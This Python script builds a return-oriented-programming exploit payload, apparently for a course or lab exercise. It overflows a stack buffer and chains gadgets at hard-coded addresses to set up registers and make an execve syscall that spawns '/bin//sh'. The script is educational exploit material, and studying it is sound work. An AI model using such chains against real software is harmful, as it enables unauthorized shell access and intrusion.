#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
# Goal: %eax = 11, %ebx = &sh1, %ebc = &&sh1, %edx = NULL


filename_ptr = pack("<I", 0xfffeb2a4)  # x 0xfffeb2a4 --> 0x6e69622f (nib/)
filename_ptr_addr = 0xfffeb334  # x 0xfffeb334 --> 0xfffeb2a4

edx_to_null = pack("<I", 0x0805c363)        # xor    %edx,%edx ; pop    %ebx ; mov    %edx,%eax ; pop    %esi ; pop    %edi ; ret
edx_to_null += b"a" * 12

# eax_to_0 = pack("<I", 0x08056100)         # xor    %eax,%eax ; ret
eax_to_0 = pack("<I", 0x08056bd8)           # xor    %eax,%eax ; pop    %ebx ; pop    %esi
eax_to_0 += b"aaaaaaaa"  # offset pop %ebx and pop %esi
eax_plus_1 = pack("<I", 0x0805e5cc)         # inc    %eax ; pop    %edi ; ret
eax_plus_1 += b"aaaa"  # offset pop %edi

eax_to_ecx_addr = pack("<I", 0x0806ce62)    # mov    %eax,(%ecx) ; add    $0xc,%esp ; pop    %ebx ; pop    %esi ; pop    %edi ; pop    %ebp ; ret
eax_to_ecx_addr += b"a" * 12  # $0xc
eax_to_ecx_addr += b"a" * 16  # four pop(s)

pop_ebx = pack("<I", 0x0804f103)            # pop    %ebx ; ret
pop_ecx = pack("<I", 0x0806de72)            # pop    %ecx ; pop    %ebx ; ret
# NEED TO MANUALLY HANDLE pop %ebx in pop_ecx

esp_plus_24 = pack("<I", 0x08078cd5)        # add    $0x10,%esp ; add    $0x8,%esp ; pop    %ebx ; ret
esp_plus_24 += b"aaaa"  # pop %ebx

system_call = pack("<I", 0x0806e780)        # int    $0x80

### Start ####
sys.stdout.buffer.write(b"/bin//sh")  # filename
sys.stdout.buffer.write(b"a" * 92)  # fill buf
sys.stdout.buffer.write(pack("<I", 0xfffeb308))  # ebp arbitrary

# envp = %edx = NULL
sys.stdout.buffer.write(edx_to_null)  # %edx = 0

# Point %ecx to array [&&sh, NULL] on stack
sys.stdout.buffer.write(esp_plus_24)  # make space for [&&sh, NULL]
sys.stdout.buffer.write(b"aaaa" * 4)
sys.stdout.buffer.write(filename_ptr)
sys.stdout.buffer.write(b"aaaa")  # to be overwritten by 0x0

# Set NULL after the filename "/bin//sh"
sys.stdout.buffer.write(eax_to_0)  # %eax = 0
sys.stdout.buffer.write(pop_ecx)  # %ecx = &fname + 8 = one word after sh
sys.stdout.buffer.write(pack("<I", 0xfffeb2ac))
sys.stdout.buffer.write(b"aaaa")  # offset pop %ebx in pop_ecx
sys.stdout.buffer.write(eax_to_ecx_addr)  # fill 0x00000000 to the word after sh

sys.stdout.buffer.write(eax_to_0)  # %eax = 0
sys.stdout.buffer.write(pop_ecx)  # %ecx = &&fname + 4 = one word after &sh
sys.stdout.buffer.write(pack("<I", filename_ptr_addr + 4))
sys.stdout.buffer.write(b"aaaa")  # offset pop %ebx in pop_ecx

sys.stdout.buffer.write(eax_to_ecx_addr)  # fill 0x00000000 to the word after &sh
sys.stdout.buffer.write(pop_ecx)  # %ecx = &&fname
sys.stdout.buffer.write(pack("<I", filename_ptr_addr))
sys.stdout.buffer.write(b"aaaa")  # offset pop %ebx in pop_ecx

# execve syscall number = %eax = 11
sys.stdout.buffer.write(eax_to_0)  # %eax = 0
sys.stdout.buffer.write(eax_plus_1 * 11)  # %eax = 11

# filename = %ebx = &sh
sys.stdout.buffer.write(pop_ebx)    # %ebx = &filename
sys.stdout.buffer.write(filename_ptr)

# %eax = 11, %ebx = 0xfffeb2a4, %ecx = 0xfffeb334, %edx = 0x0
# 0xfffeb334 --> 0xfffeb2a4 --> 0x6e69622f (nib/)
# x 0xfffeb338 -> 0x0
sys.stdout.buffer.write(system_call)
